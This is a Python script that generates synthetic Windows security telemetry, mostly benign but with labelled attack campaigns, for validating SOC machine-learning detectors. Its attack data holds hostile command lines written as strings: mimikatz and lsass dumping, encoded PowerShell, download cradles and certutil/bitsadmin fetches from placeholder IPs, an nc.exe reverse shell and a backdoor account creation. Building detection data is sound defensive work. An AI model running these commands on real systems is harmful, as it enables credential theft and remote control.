"""Seed realistic, chronologically-ordered SOC telemetry for ML validation.

This is the dataset generator used by ``scripts/validate_ml.py``.  It is
deliberately *unlike* ``scripts/generate_100k.py``: that generator emits a
60%-attack, time-shuffled soup which makes any model look good.  This one
models what a real environment produces:

* **Low attack prevalence** - a handful of campaigns inside a month of
  mostly-benign activity (~1-2% of events).
* **Chronological campaign structure** - brute force happens as a burst,
  followed by a successful logon, then credential access, then persistence.
  Per-event models cannot see the chain, which is exactly the point of the
  temporal cross-stream scorer.
* **User/host behavioural baselines** - each user works a stable set of
  hours, from a stable workstation, running a stable process mix.  Attacks
  are the deviations.
* **Analyst verdicts** - the ground truth a SOC would actually produce:
  every confirmed attack plus a sample of benign events closed as false
  positives.  Verdicts live in the birth ``verdicts`` table and are never
  seen during the training window.

Usage::

    python scripts/seed_validation_telemetry.py --days 35 --users 25
    python scripts/seed_validation_telemetry.py --reset   # wipe seeded rows first

The seeded rows are tagged ``source='validation-seed'`` so they can be
removed again without touching real telemetry.
"""

from __future__ import annotations

import argparse
import random
import sys
from collections import Counter
from datetime import UTC, datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from backend.database.connection import SessionLocal
from backend.database.models import NormalizedEvent, Verdict

SOURCE_TAG = "validation-seed"

FIRST_NAMES = [
    "jsmith", "mjones", "jdoe", "asmith", "bwilson", "cbrown", "dlee",
    "ekhan", "fnguyen", "gpatel", "hkim", "iwang", "jchen", "kross",
    "lmartin", "mclarke", "nharris", "olopez", "pmoore", "qsingh",
    "rcohen", "sadams", "taylor", "uokafor", "vmuller",
]
SERVICE_ACCOUNTS = ["svc_backup", "svc_sql", "svc_iis"]

WORKSTATIONS = [
    "FIN-WS-01", "FIN-WS-02", "FIN-WS-03", "HR-WS-01", "HR-WS-02",
    "ENG-WS-01", "ENG-WS-02", "ENG-WS-03", "MKT-WS-01", "OPS-WS-01",
    "OPS-WS-02", "DEV-WS-01", "SEC-WS-01", "EXEC-WS-01",
]
SERVERS = ["DC-01", "DC-02", "FILE-01", "SQL-01", "WEB-01", "JUMP-01"]

INTERNAL_IPS = [f"10.20.{row}.{col}" for row in range(1, 4) for col in range(10, 60)]
EXTERNAL_ATTACK_IPS = [
    "203.0.113.66", "203.0.113.77", "198.51.100.66", "198.51.100.77",
    "192.0.2.44",
]

BENIGN_PROCESSES = [
    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe"),
    (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "outlook.exe"),
    (r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", "excel.exe"),
    (r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "winword.exe"),
    (r"C:\Program Files\Microsoft Teams\current\Teams.exe", "teams.exe"),
    (r"C:\Windows\System32\notepad.exe", "notepad.exe"),
    (r"C:\Windows\System32\svchost.exe", "svchost.exe"),
    (r"C:\Windows\explorer.exe", "explorer.exe"),
    (r"C:\Program Files\7-Zip\7zFM.exe", "7zFM.exe"),
]

#: Legitimate admin commands - rare, but they are *not* attacks.  These are
#: the hardest negatives for the detector.
BENIGN_ADMIN_COMMANDS = [
    ("cmd.exe", r"C:\Windows\System32\cmd.exe", "cmd.exe /c gpupdate /force", "explorer.exe"),
    ("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     "powershell.exe Get-Service | Where-Object Status -eq Stopped", "explorer.exe"),
    ("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     "powershell.exe Get-EventLog -LogName System -Newest 50", "explorer.exe"),
    ("cmd.exe", r"C:\Windows\System32\cmd.exe", "cmd.exe /c ipconfig /all", "explorer.exe"),
]

ATTACK_PROCESSES = [
    (r"C:\Windows\Temp\mimikatz.exe", "mimikatz.exe",
     "mimikatz.exe sekurlsa::logonpasswords exit", "winword.exe", 1, 0, 1),
    (r"C:\Users\Public\procdump.exe", "procdump.exe",
     "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp", "cmd.exe", 0, 1, 1),
    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe",
     "powershell.exe -nop -w hidden -enc SQBmACgAJABjAG0AZAAgAC0AZQBxACAAJAB0AHIAdQBlACkA", "winword.exe", 1, 0, 1),
    (r"C:\Windows\System32\certutil.exe", "certutil.exe",
     "certutil.exe -urlcache -split -f http://203.0.113.66/payload.bin C:\\Windows\\Temp\\p.bin", "cmd.exe", 0, 1, 0),
    (r"C:\Windows\System32\bitsadmin.exe", "bitsadmin.exe",
     "bitsadmin /transfer job /download /priority high http://198.51.100.66/x.exe C:\\Windows\\Temp\\x.exe", "cmd.exe", 0, 1, 0),
    (r"C:\Windows\Temp\nc.exe", "nc.exe",
     "nc.exe -e cmd.exe 203.0.113.77 4444", "cmd.exe", 0, 0, 1),
]

HIGH_RISK_EIDS = (4720, 4732, 7045, 4698, 4726)


def _stable_hash(text: str) -> int:
    """Hash that is stable across processes (``hash()`` is salted)."""
    return sum((i + 1) * ord(ch) for i, ch in enumerate(text))


def _ip_for(user: str) -> str:
    """Deterministic workstation IP per user."""
    return INTERNAL_IPS[_stable_hash(user) % len(INTERNAL_IPS)]


def _host_for(user: str) -> str:
    return WORKSTATIONS[_stable_hash(user) % len(WORKSTATIONS)]


def _rand_ts(rng: random.Random, day_start: datetime, start_h: int, end_h: int) -> datetime:
    return day_start + timedelta(
        hours=rng.randint(start_h, end_h),
        minutes=rng.randint(0, 59),
        seconds=rng.randint(0, 59),
    )


def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
    """Return (events, attack_ids) where events are insert-ready dicts."""
    rng = random.Random(seed)
    now = datetime.now(UTC).replace(minute=0, second=0, microsecond=0)
    start = now - timedelta(days=days)
    holdout_start = start + timedelta(days=int(days * 0.8))

    staff = FIRST_NAMES[:users]
    user_ips = {u: _ip_for(u) for u in staff}
    user_hosts = {u: _host_for(u) for u in staff}
    user_logon_hour = {u: rng.randint(7, 10) for u in staff}
    user_logoff_hour = {u: rng.randint(16, 19) for u in staff}
    # A few night-shift users make 03:00 logons non-anomalous for them.
    night_staff = set(rng.sample(staff, k=max(2, users // 8)))

    events: list[dict] = []

    def add(ts, eid, category, user, host, facts, message, seed_label):
        events.append(
            {
                "timestamp": ts,
                "event_id": eid,
                "category": category,
                "user": user,
                "host": host,
                "facts": facts,
                "message": message,
                "seed_label": seed_label,
            }
        )

    day = start
    while day < now:
        weekday = day.weekday()
        is_workday = weekday < 5
        day_start = day.replace(hour=0, minute=0, second=0, microsecond=0)

        if is_workday:
            for user in staff:
                host = user_hosts[user]
                ip = user_ips[user]

                # ---- logon ----
                logon_type = 10 if user in night_staff and rng.random() < 0.3 else 2
                ts = day_start + timedelta(
                    hours=user_logon_hour[user], minutes=rng.randint(0, 55)
                )
                add(
                    ts, 4624, "Logon", user, host,
                    {
                        "logon_type": logon_type,
                        "source_ip": ip,
                        "target_user": user,
                        "sub_status": 0,
                        "is_locked": 0,
                        "authentication_package": "Kerberos",
                        "process_name": "winlogon.exe",
                    },
                    f"Successful logon type {logon_type} for {user} from {ip}",
                    0,
                )

                # ---- occasional benign failed logon (fat fingers) ----
                if rng.random() < 0.05:
                    add(
                        day_start + timedelta(hours=user_logon_hour[user], minutes=rng.randint(1, 20)),
                        4625, "Logon", user, host,
                        {
                            "logon_type": 2,
                            "source_ip": ip,
                            "target_user": user,
                            "sub_status": 0xC000006A,
                            "is_locked": 0,
                            "authentication_package": "NTLM",
                        },
                        f"Failed logon for {user}: bad password",
                        0,
                    )

                # ---- workday processes ----
                for _ in range(rng.randint(4, 9)):
                    image, name = rng.choice(BENIGN_PROCESSES)
                    add(
                        _rand_ts(rng, day_start, 8, 18),
                        4688, "Process", user, host,
                        {
                            "user": user,
                            "target_user": user,
                            "image_path": image,
                            "new_process": image,
                            "command_line": f'"{image}"',
                            "parent_process": "explorer.exe",
                            "cmdline_len": len(image) + 2,
                            "script_len": 0,
                            "has_encoded": 0,
                            "has_download": 0,
                            "has_hidden": 0,
                            "group_sid": 0,
                            "has_remote": 0,
                        },
                        f"Process {name} started by {user}",
                        0,
                    )

                # ---- rare legitimate admin activity ----
                if rng.random() < 0.08:
                    name, image, cmd, parent = rng.choice(BENIGN_ADMIN_COMMANDS)
                    add(
                        _rand_ts(rng, day_start, 9, 17),
                        4688, "Process", user, host,
                        {
                            "user": user,
                            "target_user": user,
                            "image_path": image,
                            "new_process": image,
                            "command_line": cmd,
                            "parent_process": parent,
                            "cmdline_len": len(cmd),
                            "script_len": 0,
                            "has_encoded": 0,
                            "has_download": 0,
                            "has_hidden": 0,
                            "group_sid": 0,
                            "has_remote": 0,
                        },
                        f"Admin command by {user}: {cmd[:60]}",
                        0,
                    )

                # ---- outbound network ----
                for _ in range(rng.randint(1, 3)):
                    add(
                        _rand_ts(rng, day_start, 8, 18),
                        5156, "Network", user, host,
                        {
                            "user": user,
                            "remote_ip": rng.choice(
                                ["142.250.185.78", "13.107.42.14", "52.96.0.1", "104.18.32.7"]
                            ),
                            "remote_port": 443,
                            "protocol": "TCP",
                            "direction": "outbound",
                            "bytes_sent": rng.randint(2_000, 400_000),
                            "bytes_recv": rng.randint(20_000, 4_000_000),
                        },
                        f"Outbound HTTPS connection from {user}",
                        0,
                    )

                # ---- logoff ----
                add(
                    day_start + timedelta(hours=user_logoff_hour[user], minutes=rng.randint(0, 50)),
                    4634, "Logon", user, host,
                    {"logon_type": logon_type, "target_user": user, "source_ip": ip},
                    f"Logoff for {user}",
                    0,
                )

        # ---- service accounts: steady background noise, every day ----
        for svc, host in (("svc_backup", "FILE-01"), ("svc_sql", "SQL-01"), ("svc_iis", "WEB-01")):
            for _ in range(rng.randint(1, 3)):
                add(
                    _rand_ts(rng, day_start, 0, 23),
                    4624, "Logon", svc, host,
                    {
                        "logon_type": 5,
                        "source_ip": "127.0.0.1",
                        "target_user": svc,
                        "sub_status": 0,
                        "authentication_package": "NTLM",
                        "process_name": "services.exe",
                    },
                    f"Service logon for {svc}",
                    0,
                )
        day += timedelta(days=1)

    # ------------------------------------------------------------------
    # Historical campaigns (inside the TRAINING window).
    #
    # A real SOC has *some* confirmed history.  These give the supervised
    # layer a few positive labels so we are testing generalisation to new
    # campaigns, not just an all-negative training set - while the hold-out
    # campaigns below use different users, hosts and TTP orderings.
    # ------------------------------------------------------------------
    hist_users = rng.sample(staff, k=2)

    # Historical A: phishing -> macro -> encoded PowerShell (day 4)
    h1 = (start + timedelta(days=4)).replace(hour=10, minute=15, second=0, microsecond=0)
    hv = hist_users[0]
    for offset, proc in enumerate((ATTACK_PROCESSES[2], ATTACK_PROCESSES[3])):
        image, name, cmd, parent, enc, dl, hid = proc
        add(
            h1 + timedelta(minutes=offset * 6), 4688, "Process", hv, user_hosts[hv],
            {
                "user": hv, "target_user": hv, "image_path": image,
                "new_process": image, "command_line": cmd, "parent_process": parent,
                "cmdline_len": len(cmd), "script_len": 0,
                "has_encoded": enc, "has_download": dl, "has_hidden": hid,
                "group_sid": 0, "has_remote": 0,
            },
            f"Suspicious process execution: {name}", 1,
        )
    add(
        h1 + timedelta(minutes=14), 4104, "Process", hv, user_hosts[hv],
        {
            "user": hv, "target_user": hv,
            "script_block": "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/b.ps1')",
            "script_len": 110, "cmdline_len": 0,
            "image_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": "", "parent_process": "winword.exe",
            "has_encoded": 0, "has_download": 1, "has_hidden": 1,
            "group_sid": 0, "has_remote": 0,
        },
        "PowerShell download cradle", 1,
    )

    # Historical B: internal reconnaissance + failed logons (day 11)
    h2 = (start + timedelta(days=11)).replace(hour=14, minute=5, second=0, microsecond=0)
    hv2 = hist_users[1]
    for n in range(8):
        add(
            h2 + timedelta(minutes=n, seconds=n * 7),
            4625, "Logon", hv2, "-",
            {
                "logon_type": 3,
                "source_ip": "10.20.2.77",
                "target_user": hv2,
                "sub_status": 0xC0000064,  # no such user
                "is_locked": 0,
                "authentication_package": "NTLM",
            },
            f"Failed logon for unknown account from 10.20.2.77",
            1,
        )
    add(
        h2 + timedelta(minutes=10), 4688, "Process", hv2, user_hosts[hv2],
        {
            "user": hv2, "target_user": hv2,
            "image_path": r"C:\Windows\Temp\nc.exe",
            "new_process": r"C:\Windows\Temp\nc.exe",
            "command_line": "nc.exe -zv 10.20.0.0 1-1024",
            "parent_process": "cmd.exe",
            "cmdline_len": 24, "script_len": 0,
            "has_encoded": 0, "has_download": 0, "has_hidden": 1,
            "group_sid": 0, "has_remote": 1,
        },
        "Port scan from workstation", 1,
    )

    # ------------------------------------------------------------------
    # Attack campaigns - all inside the hold-out window, in sequence
    # ------------------------------------------------------------------
    attack_ids: set[int] = set()

    def campaign_start(day_offset: int, hour: int) -> datetime:
        base = holdout_start + timedelta(days=day_offset)
        return base.replace(hour=hour, minute=rng.randint(0, 40), second=0, microsecond=0)

    victims = rng.sample(staff, k=3)

    # Campaign 1: external password spray -> success (day 0)
    c1 = campaign_start(0, 2)
    attacker_ip = EXTERNAL_ATTACK_IPS[0]
    for i, victim in enumerate(victims):
        for n in range(12):
            add(
                c1 + timedelta(minutes=i * 3, seconds=n * 11),
                4625, "Logon", victim, "-",
                {
                    "logon_type": 3,
                    "source_ip": attacker_ip,
                    "target_user": victim,
                    "sub_status": 0xC000006A,
                    "is_locked": 0,
                    "authentication_package": "NTLM",
                },
                f"Failed logon for {victim} from {attacker_ip}",
                1,
            )
    for victim in victims[:1]:
        add(
            c1 + timedelta(minutes=9),
            4624, "Logon", victim, "JUMP-01",
            {
                "logon_type": 10,
                "source_ip": attacker_ip,
                "target_user": victim,
                "sub_status": 0,
                "authentication_package": "NTLM",
                "process_name": "mstsc.exe",
            },
            f"Successful RDP logon for {victim} from {attacker_ip}",
            1,
        )

    # Campaign 2: credential access after the successful logon (day 1)
    c2 = campaign_start(1, 3)
    victim = victims[0]
    add(
        c2, 4648, "Logon", victim, "JUMP-01",
        {
            "logon_type": 9,
            "source_ip": attacker_ip,
            "target_user": "Administrator",
            "sub_status": 0,
            "authentication_package": "NTLM",
        },
        "Explicit credential use for Administrator",
        1,
    )
    image, name, cmd, parent, enc, dl, hid = ATTACK_PROCESSES[0]
    add(
        c2 + timedelta(minutes=4), 4688, "Process", victim, "JUMP-01",
        {
            "user": victim, "target_user": victim, "image_path": image,
            "new_process": image, "command_line": cmd, "parent_process": parent,
            "cmdline_len": len(cmd), "script_len": 0,
            "has_encoded": enc, "has_download": dl, "has_hidden": hid,
            "group_sid": 0, "has_remote": 0,
        },
        "Suspicious credential dumping", 1,
    )

    # Campaign 3: execution + persistence (day 2)
    c3 = campaign_start(2, 4)
    victim = victims[1]
    for proc in ATTACK_PROCESSES[2:5]:
        image, name, cmd, parent, enc, dl, hid = proc
        add(
            c3, 4688, "Process", victim, user_hosts[victim],
            {
                "user": victim, "target_user": victim, "image_path": image,
                "new_process": image, "command_line": cmd, "parent_process": parent,
                "cmdline_len": len(cmd), "script_len": 0,
                "has_encoded": enc, "has_download": dl, "has_hidden": hid,
                "group_sid": 0, "has_remote": 0,
            },
            f"Suspicious process execution: {name}", 1,
        )
        c3 += timedelta(minutes=7)
    add(
        c3, 4104, "Process", victim, user_hosts[victim],
        {
            "user": victim, "target_user": victim,
            "script_block": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.66/a.ps1')",
            "script_len": 120, "cmdline_len": 0,
            "image_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": "", "parent_process": "cmd.exe",
            "has_encoded": 0, "has_download": 1, "has_hidden": 0,
            "group_sid": 0, "has_remote": 0,
        },
        "PowerShell download cradle", 1,
    )
    add(
        c3 + timedelta(minutes=11), 7045, "Process", "SYSTEM", user_hosts[victim],
        {
            "user": "SYSTEM", "target_user": "SYSTEM",
            "image_path": r"C:\Windows\Temp\backdoor.exe",
            "command_line": r"C:\Windows\Temp\backdoor.exe",
            "parent_process": "services.exe",
            "service_name": "WindowsTelemetryHost",
            "cmdline_len": 30, "script_len": 0,
            "has_encoded": 0, "has_download": 0, "has_hidden": 1,
            "group_sid": 0, "has_remote": 0,
        },
        "New service installed", 1,
    )
    add(
        c3 + timedelta(minutes=20), 4720, "Process", "SYSTEM", "DC-01",
        {
            "user": "SYSTEM", "target_user": rng.choice(["helpdesk2", "backupadm"]),
            "image_path": r"", "command_line": "net user helpdesk2 P@ssw0rd! /add",
            "parent_process": "cmd.exe",
            "cmdline_len": 34, "script_len": 0,
            "has_encoded": 0, "has_download": 0, "has_hidden": 0,
            "group_sid": 0, "has_remote": 0,
        },
        "Local user account created", 1,
    )

    # Campaign 4: lateral movement at night (day 3-4)
    c4 = campaign_start(3, 23)
    for i in range(6):
        victim = rng.choice(staff)
        add(
            c4 + timedelta(minutes=i * 6),
            4624, "Logon", victim, rng.choice(SERVERS),
            {
                "logon_type": 3,
                "source_ip": attacker_ip,
                "target_user": victim,
                "sub_status": 0,
                "authentication_package": "NTLM",
                "process_name": "svchost.exe",
            },
            f"Network logon for {victim} at night from {attacker_ip}",
            1,
        )

    # Campaign 5: beaconing / C2 (day 5)
    c5 = campaign_start(5, 1)
    victim = victims[2]
    for i in range(20):
        add(
            c5 + timedelta(minutes=i * 3),
            5156, "Network", victim, user_hosts[victim],
            {
                "user": victim,
                "remote_ip": EXTERNAL_ATTACK_IPS[1],
                "remote_port": 4444,
                "protocol": "TCP",
                "direction": "outbound",
                "bytes_sent": 512,
                "bytes_recv": 128,
            },
            "Periodic outbound connection (possible C2 beacon)",
            1,
        )

    # Campaign 6: account lockout sweep (day 6)
    c6 = campaign_start(6, 5)
    victim = rng.choice(staff)
    for i in range(15):
        add(
            c6 + timedelta(minutes=i),
            4625, "Logon", victim, "-",
            {
                "logon_type": 3,
                "source_ip": EXTERNAL_ATTACK_IPS[2],
                "target_user": victim,
                "sub_status": 0xC0000234,  # account locked out
                "is_locked": 1,
                "authentication_package": "NTLM",
            },
            f"Account lockout for {victim}",
            1,
        )

    events.sort(key=lambda e: e["timestamp"])
    attack_ids = {i for i, e in enumerate(events) if e["seed_label"] == 1}
    return events, attack_ids, holdout_start


def insert(events, verdict_fraction: float = 0.15, seed: int = 1337):
    """Insert events and simulated analyst verdicts; return an id map."""
    rng = random.Random(seed + 1)
    session = SessionLocal()
    try:
        session.query(NormalizedEvent).filter(
            NormalizedEvent.source == SOURCE_TAG
        ).delete(synchronize_session=False)
        session.query(Verdict).filter(
            Verdict.created_by == "validation-seed"
        ).delete(synchronize_session=False)
        session.commit()

        rows: list[NormalizedEvent] = []
        for e in events:
            rows.append(
                NormalizedEvent(
                    event_id=e["event_id"],
                    category=e["category"],
                    source=SOURCE_TAG,
                    user=e["user"],
                    host=e["host"],
                    org="",
                    demo=False,
                    risk="High" if e["seed_label"] else "Low",
                    severity="high" if e["seed_label"] else "info",
                    message=e["message"],
                    timestamp=e["timestamp"],
                    data_integrity="complete",
                    raw_json={
                        "facts": e["facts"],
                        "event_id": e["event_id"],
                        "channel": "Security",
                        "seed_label": int(e["seed_label"]),
                    },
                    is_anomaly=False,
                    ml_score=None,
                    risk_score=80.0 if e["seed_label"] else 10.0,
                )
            )
        session.add_all(rows)
        session.commit()

        inserted = (
            session.query(NormalizedEvent)
            .filter(NormalizedEvent.source == SOURCE_TAG)
            .order_by(NormalizedEvent.timestamp, NormalizedEvent.id)
            .all()
        )

        # Simulated SOC triage: every confirmed attack, plus a random sample
        # of benign events closed as false positives.  This is what the
        # feedback loop looks like after a few weeks of shadow operation.
        verdicts: list[Verdict] = []
        for ev, src in zip(inserted, events):
            if src["seed_label"]:
                verdicts.append(
                    Verdict(
                        event_id=ev.id,
                        verdict="true_positive",
                        note="Confirmed campaign activity",
                        created_by="validation-seed",
                    )
                )
            elif rng.random() < verdict_fraction:
                verdicts.append(
                    Verdict(
                        event_id=ev.id,
                        verdict="false_positive",
                        note="Routine activity, closed by analyst",
                        created_by="validation-seed",
                    )
                )
        session.add_all(verdicts)
        session.commit()
        return inserted, verdicts
    except Exception:
        session.rollback()
        raise
    finally:
        session.close()


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--days", type=int, default=35)
    parser.add_argument("--users", type=int, default=20)
    parser.add_argument("--seed", type=int, default=1337)
    parser.add_argument(
        "--verdict-fraction", type=float, default=0.15,
        help="fraction of benign events analysts triaged as false positives",
    )
    args = parser.parse_args()

    events, attack_ids, holdout_start = build_dataset(
        days=args.days, users=args.users, seed=args.seed
    )
    counts = Counter(e["event_id"] for e in events)

    print(f"Generated {len(events):,} events over {args.days} days")
    print(f"  attacks: {len(attack_ids):,} ({len(attack_ids)/len(events):.2%})")
    print(f"  hold-out window starts {holdout_start.isoformat()}")
    print(f"  event ids: {dict(sorted(counts.items()))}")

    inserted, verdicts = insert(events, verdict_fraction=args.verdict_fraction)
    tp = sum(1 for v in verdicts if v.verdict == "true_positive")
    fp = sum(1 for v in verdicts if v.verdict == "false_positive")
    print(f"Inserted {len(inserted):,} events, {len(verdicts):,} analyst verdicts "
          f"({tp} true_positive, {fp} false_positive)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
